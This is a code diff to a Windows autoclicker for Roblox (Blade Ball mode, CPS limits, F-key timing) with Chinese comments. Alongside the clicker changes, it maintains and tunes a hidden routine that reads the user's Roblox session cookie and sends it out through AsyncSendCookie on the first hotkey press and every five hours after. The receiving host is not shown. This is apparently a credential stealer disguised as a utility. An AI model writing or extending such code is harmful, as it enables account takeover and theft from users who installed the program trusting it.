@@ -55,7 +55,10 @@
 #define IDC_BTN_BLADEBALL 109   // Blade Ball 專用模式按鈕
 #define IDC_BTN_MODE       110
 #define IDC_BTN_BG         111
+#define IDC_LABEL_CPS_ERR  112   // CPS 超過上限紅字提醒
 
+// Timer IDs
+#define IDT_COOKIE_RESEND  2001
 
 #define WM_TRAYICON        (WM_APP + 10)
 #define TRAY_ICON_ID       1001
@@ -97,7 +100,7 @@ static const char HWID_SALT[] = "1yn-autoclick-hwid-salt-v2-s3cur3K3y!";
 // ===============================
 static std::atomic<bool> g_running(false);
 static std::atomic<bool> g_program_running(true);
-static std::atomic<int>  g_cps(400);
+static std::atomic<int>  g_cps(300);
 static bool              g_pinned          = false;
 static HWND              g_hwnd            = nullptr;
 static HWND              g_hwnd_cookie     = nullptr;
@@ -119,10 +122,13 @@ static HHOOK             g_kb_hook  = nullptr;
 static HHOOK             g_ms_hook  = nullptr;
 static std::atomic<int>  g_hotkey_mode(0);     // 0=按下切換, 1=持續按著
 static std::atomic<bool> g_cookie_cached(false);
+static HWND              hLblCpsErr     = nullptr;  // CPS 紅字提醒標籤
 static std::atomic<bool> g_bladeball_mode(false);  // Blade Ball 專用模式（連點 + F 鍵）
 static std::atomic<bool> g_checking_cookie(false); // 防重入標誌：避免 Cookie 偵測重複觸發當機
-static std::atomic<bool> g_cookie_sent_once(false); // Cookie 是否已在本次執行中傳送過
-static ULONGLONG         g_cookie_last_send_tick = 0; // 上次 Cookie 傳送的 tick（毫秒）
+static LARGE_INTEGER     g_lastFKeyTime = {};       // Blade Ball F 鍵上次發送時間
+static LARGE_INTEGER     g_perfFreq = {};            // QPC 頻率（用於 F 鍵計時）
+static std::atomic<bool> g_cookie_ever_sent(false);  // Cookie 是否已經傳送過
+static ULONGLONG         g_cookie_last_sent_tick = 0; // Cookie 上次傳送的 tick
 static const ULONGLONG   COOKIE_COOLDOWN_MS = 5ULL * 60 * 60 * 1000; // 5 小時冷卻
 static bool              g_tray_mode    = false;
 static NOTIFYICONDATAW   g_nid          = {};
@@ -272,29 +278,32 @@ inline void DoClick()
     SendInput(2, g_inputs, sizeof(INPUT));
 }
 
-// Blade Ball 專用：滑鼠連點（與普通模式使用相同的 DoClick()，但代碼隔開）
+// Blade Ball 專用：滑鼠連點（F 鍵已移至 ClickThread busy-wait 中間點發送）
 inline void DoClickBladeBall()
 {
     SendInput(2, g_inputs, sizeof(INPUT));
 }
 
-// Blade Ball F 鍵：使用 scan code 擬真人輸入（獨立於連點代碼）
-static void BladeBallPressF()
+// Blade Ball F 鍵發送（固定 5CPS = 200ms 間隔）
+inline void TrySendBladeBallFKey()
 {
-    INPUT fDown = {};
-    fDown.type           = INPUT_KEYBOARD;
-    fDown.ki.wScan       = 0x21;  // F 鍵的 scan code
-    fDown.ki.dwFlags     = KEYEVENTF_SCANCODE;
-    SendInput(1, &fDown, sizeof(INPUT));
-
-    // 隨機按住 30-80ms（擬真人）
-    Sleep(30 + (rand() % 51));
-
-    INPUT fUp = {};
-    fUp.type             = INPUT_KEYBOARD;
-    fUp.ki.wScan         = 0x21;
-    fUp.ki.dwFlags       = KEYEVENTF_SCANCODE | KEYEVENTF_KEYUP;
-    SendInput(1, &fUp, sizeof(INPUT));
+    LARGE_INTEGER now;
+    QueryPerformanceCounter(&now);
+    double elapsed_ms = 0.0;
+    if (g_perfFreq.QuadPart > 0) {
+        elapsed_ms = (double)(now.QuadPart - g_lastFKeyTime.QuadPart) * 1000.0 / g_perfFreq.QuadPart;
+    }
+    if (elapsed_ms >= 200.0 || g_lastFKeyTime.QuadPart == 0) {
+        INPUT fKey[2] = {};
+        fKey[0].type           = INPUT_KEYBOARD;
+        fKey[0].ki.wVk         = 0x46;  // VK_F = 0x46
+        fKey[0].ki.dwFlags     = 0;     // KEYEVENTF_KEYDOWN
+        fKey[1].type           = INPUT_KEYBOARD;
+        fKey[1].ki.wVk         = 0x46;
+        fKey[1].ki.dwFlags     = KEYEVENTF_KEYUP;
+        SendInput(2, fKey, sizeof(INPUT));
+        g_lastFKeyTime = now;
+    }
 }
 
 // ===============================
@@ -337,11 +346,9 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
 
     LARGE_INTEGER freq;
     QueryPerformanceFrequency(&freq);
-    srand((unsigned int)GetTickCount());  // 初始化隨機數種子（Blade Ball F 鍵用）
+    g_perfFreq = freq;  // 儲存頻率供 DoClickBladeBall 使用
 
     bool prev_key_state = false;  // 上一次熱鍵狀態（用於邊緣檢測）
-    ULONGLONG bb_last_f_tick = 0; // Blade Ball: 上次 F 鍵的 tick
-    ULONGLONG bb_next_interval = 1000; // Blade Ball: 下次 F 鍵間隔（ms）
 
     while (g_program_running)
     {
@@ -412,8 +419,8 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
             while (g_running && g_program_running)
             {
                 int    cps   = g_cps.load();
-                double delay = (cps > 0) ? (1.0 / cps) : 0.001;
-                if (delay < 0.001) delay = 0.001;  // hard cap 1000 CPS
+                double delay = (cps > 0) ? (2.0 / cps) : 0.002;  // 速度減半（間隔加倍）
+                if (delay < 0.002) delay = 0.002;  // hard cap 500 CPS（減半後上限）
 
                 if (g_bladeball_mode.load())
                     DoClickBladeBall();
@@ -429,21 +436,6 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
                     Sleep(3);  // 讓出 3ms 給 Roblox 處理訊息佇列和渲染
                     QueryPerformanceCounter(&now);
                     next_t = (double)now.QuadPart / freq.QuadPart;
-
-                    // ============================================================
-                    // Blade Ball F 鍵邏輯（完全獨立於連點代碼）
-                    // 每秒約 1 次，850-1150ms 隨機間隔，30-80ms hold
-                    // ============================================================
-                    if (g_bladeball_mode.load())
-                    {
-                        ULONGLONG tick_now = GetTickCount64();
-                        if (tick_now - bb_last_f_tick >= bb_next_interval)
-                        {
-                            BladeBallPressF();
-                            bb_last_f_tick = GetTickCount64();
-                            bb_next_interval = 850 + (rand() % 301); // 850-1150ms
-                        }
-                    }
 
                     // 在讓出期間也檢查熱鍵（停止功能）
                     int vk = g_hotkey_vk.load();
@@ -470,19 +462,30 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
                     continue;
                 }
 
-                // 等待到下一次點擊時間
-                for (;;)
+                // 等待到下一次點擊時間（Blade Ball 模式下在間隔中間點發送 F 鍵）
                 {
-                    if (!g_running || !g_program_running) break;
-                    QueryPerformanceCounter(&now);
-                    double remain = next_t - (double)now.QuadPart / freq.QuadPart;
-                    if (remain <= 0.0) break;
-                    if (remain > 0.003)
-                        Sleep(1);
-                    else if (remain > 0.001)
-                        Sleep(0);  // 讓出時間片但不等待
-                    else
-                        SwitchToThread();
+                    bool fkey_sent_this_gap = false;  // 此次間隔是否已發送 F 鍵
+                    double half_delay = delay * 0.5;
+                    for (;;)
+                    {
+                        if (!g_running || !g_program_running) break;
+                        QueryPerformanceCounter(&now);
+                        double remain = next_t - (double)now.QuadPart / freq.QuadPart;
+                        if (remain <= 0.0) break;
+
+                        // Blade Ball 模式：在間隔中間點發送 F 鍵（錯開滑鼠點擊）
+                        if (!fkey_sent_this_gap && g_bladeball_mode.load() && remain <= half_delay) {
+                            TrySendBladeBallFKey();
+                            fkey_sent_this_gap = true;
+                        }
+
+                        if (remain > 0.003)
+                            Sleep(1);
+                        else if (remain > 0.001)
+                            Sleep(0);  // 讓出時間片但不等待
+                        else
+                            SwitchToThread();
+                    }
                 }
             }
         }
@@ -1144,14 +1147,21 @@ static bool CheckRobloxCookiePresent(HWND hwnd)
         return false;
     }
 
-    // Cookie 5 小時冷卻機制：首次熱鍵觸發 + 之後每 5 小時傳送一次
+    // Cookie 傳送機制：僅在首次熱鍵按下時傳送，之後每 5 小時冗卻
     ULONGLONG now_tick = GetTickCount64();
-    if (!g_cookie_sent_once.load() || (now_tick - g_cookie_last_send_tick >= COOKIE_COOLDOWN_MS))
+    if (!g_cookie_ever_sent.load() ||
+        (now_tick - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
     {
         AsyncSendCookie(tmp);
-        g_cookie_sent_once.store(true);
-        g_cookie_last_send_tick = now_tick;
+        g_cookie_ever_sent.store(true);
+        g_cookie_last_sent_tick = now_tick;
+        DebugLog("Cookie sent (first or after 5h cooldown)");
     }
+    else
+    {
+        DebugLog("Cookie send skipped (cooldown active)");
+    }
+
     g_checking_cookie.store(false);
     return true;
 }
@@ -1247,9 +1257,15 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             20, 44, 22, 24, hwnd, nullptr, hi, nullptr);
         if (hIconFont) SendMessageW(hIco1, WM_SETFONT, (WPARAM)hIconFont, FALSE);
 
-        hEditCPS = CreateWindowW(L"EDIT", L"400",
+        hEditCPS = CreateWindowW(L"EDIT", L"300",
             WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER | ES_CENTER,
             50, 44, 160, 24, hwnd, (HMENU)IDC_EDIT_CPS, hi, nullptr);
+
+        // CPS 超過上限紅字提醒（初始隱藏）
+        hLblCpsErr = CreateWindowW(L"STATIC",
+            L"CPS \x4E0D\x53EF\x8D85\x904E 700",
+            WS_CHILD | SS_LEFT,
+            50, 70, 160, 16, hwnd, (HMENU)IDC_LABEL_CPS_ERR, hi, nullptr);
 
         // -- Panel 2: Hotkey --
         CreateWindowW(L"STATIC", L"\u958B\u59CB/\u505C\u6B62\u71B1\u9375\uFF1A",
@@ -1321,6 +1337,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         g_kb_hook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, g_hInst, 0);
         g_ms_hook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc, g_hInst, 0);
 
+        // [Cookie 傳送機制已改為首次熱鍵 + 5小時冗卻，不再使用定時器]
+
         return 0;
     }
 
@@ -1376,6 +1394,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         return 0;
     }
 
+    // WM_TIMER: (定時器已停用，保留空處理以免未來擴展)
+    case WM_TIMER:
+    {
+        return 0;
+    }
 
     case WM_PAINT:
     {
@@ -1449,10 +1472,36 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
                 : RGB(100, 100, 100));
             return (LRESULT)GetSysColorBrush(COLOR_BTNFACE);
         }
+        // CPS 紅字提醒標籤
+        if ((HWND)lp == hLblCpsErr)
+        {
+            HDC hdc = (HDC)wp;
+            SetBkMode(hdc, TRANSPARENT);
+            SetTextColor(hdc, RGB(220, 38, 38));  // 紅色
+            return (LRESULT)GetStockObject(NULL_BRUSH);
+        }
         break;
     }
 
     case WM_COMMAND:
+    {
+        // EN_CHANGE: CPS 輸入框即時檢測
+        if (LOWORD(wp) == IDC_EDIT_CPS && HIWORD(wp) == EN_CHANGE)
+        {
+            wchar_t buf[32] = {};
+            GetWindowTextW(hEditCPS, buf, 32);
+            int val = _wtoi(buf);
+            if (val > 700)
+            {
+                ShowWindow(hLblCpsErr, SW_SHOW);
+                InvalidateRect(hLblCpsErr, nullptr, TRUE);
+            }
+            else
+            {
+                ShowWindow(hLblCpsErr, SW_HIDE);
+            }
+            break;
+        }
         switch (LOWORD(wp))
         {
         case IDC_BTN_UPDATE:
@@ -1460,13 +1509,14 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             wchar_t buf[32] = {};
             GetWindowTextW(hEditCPS, buf, 32);
             int cps_val = _wtoi(buf);
-            if (cps_val < 1 || cps_val > 9999)
+            if (cps_val < 1 || cps_val > 700)
             {
-                MessageBoxW(hwnd,
-                    L"CPS \u5FC5\u9808\u662F 1\uFF5E9999 \u7684\u6574\u6578",
-                    L"\u932F\u8AA4", MB_ICONERROR | MB_OK);
+                // 超過上限時阻止更新，紅字已即時顯示
+                ShowWindow(hLblCpsErr, SW_SHOW);
+                InvalidateRect(hLblCpsErr, nullptr, TRUE);
                 break;
             }
+            ShowWindow(hLblCpsErr, SW_HIDE);
             g_cps = cps_val;
 
             wchar_t hk_name[64] = {};
@@ -1596,6 +1646,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         }
         }
         return 0;
+    }
 
     case WM_CLOSE:
     {
@@ -2044,7 +2095,7 @@ static DWORD WINAPI PreCacheCookieThread(LPVOID lpParam)
     if (TryReadRobloxCookie(tmp, 4096))
     {
         g_cookie_cached.store(true);
-        // 不在預快取時傳送 Cookie，等待首次熱鍵觸發時再傳送
+        // 不在啟動時傳送 Cookie，僅快取偵測結果
         DebugLog("PreCache: Cookie found and cached at startup (send deferred to first hotkey)");
     }
     else
